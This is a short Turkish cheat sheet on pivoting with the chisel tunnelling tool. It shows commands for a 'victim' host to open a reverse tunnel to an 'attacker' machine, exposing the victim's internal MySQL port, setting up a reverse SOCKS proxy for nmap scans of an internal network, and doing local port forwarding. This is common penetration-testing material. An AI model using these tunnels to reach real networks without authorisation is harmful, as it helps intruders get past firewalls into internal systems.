# 1) Reverse Port Forwarding (en yaygın kullanım)

Hedef makine dışarı çıkabiliyor ama sen içeri giremiyorsun (NAT/firewall arkasında).
Hedefteki bir servisi kendi makinene çekersin.

Senin makinende (attacker) — server:
```bash
chisel server -p 8080 --reverse
```

Hedef makinede (victim) — client:
```bash
chisel client 10.10.14.5:8080 R:9000:127.0.0.1:3306
```
Sonuç: Hedefin `127.0.0.1:3306` (MySQL) portu, senin makinende `localhost:9000` olarak açılır.

R: = reverse anlamına gelir. 
## Format: 
```R:<local_port>:<hedef_ip>:<hedef_port>```

# 2) SOCKS Proxy (dinamik pivoting — en güçlü)

Tüm iç ağı proxychains/Burp üzerinden gezmek için. Tek tek port belirtmen gerekmez.

Senin makinende:
```
./chisel server -p 8080 --reverse
```

Hedef makinede:
```
./chisel client 10.10.14.5:8080 R:socks
```

Bu, senin makinende `127.0.0.1:1080` üzerinde bir SOCKS5 proxy açar. Sonra:

#### /etc/proxychains4.conf içine:
```bash
socks5 127.0.0.1 1080
```

# Kullanım:
```bash
proxychains nmap -sT -Pn 172.16.5.10
proxychains curl http://172.16.5.10
```

# 3) Local Port Forwarding

Sen server'a erişebiliyorsun ve onun arkasındaki bir servise erişmek istiyorsun.

Server (hedef tarafta):
```bash
chisel server -p 8080
```

Client (senin makinende):
```bash
chisel client <server_ip>:8080 9000:172.16.5.10:80
```

Senin `localhost:9000` → hedefin ağındaki `172.16.5.10:80`'e gider.
**Faydalı Bayraklar**

┌──────────────────┬──────────────────────────────────────────────────────────────────┐
│      Bayrak      │                             Açıklama                             │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --reverse        │ Server'ın reverse tünellere izin vermesi (zorunlu, reverse için) │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --socks5         │ SOCKS5 desteği                                                   │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --auth user:pass │ Kimlik doğrulama (server ve client aynı olmalı)                  │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --keepalive 25s  │ Bağlantıyı canlı tut (NAT timeout'a karşı)                       │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ -v               │ Verbose / debug logları                                          │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --pid            │ PID dosyası yaz                                                  │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ R:socks          │ Reverse SOCKS proxy                                              │
└──────────────────┴──────────────────────────────────────────────────────────────────┘
